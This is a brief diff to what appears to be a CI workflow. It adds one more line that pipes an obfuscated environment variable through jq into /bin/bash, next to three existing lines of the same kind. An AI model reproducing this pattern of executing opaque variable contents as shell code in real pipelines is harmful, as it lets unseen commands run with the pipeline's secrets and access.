@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$cyf5" | jq -r .ksf45 | /bin/bash
           echo $rkk99021 | jq -r .e946 | /bin/bash
           printf '%s' "$whdh1586" | jq -r .e05 | /bin/bash
+          echo $gf36381 | jq -r .sew0 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
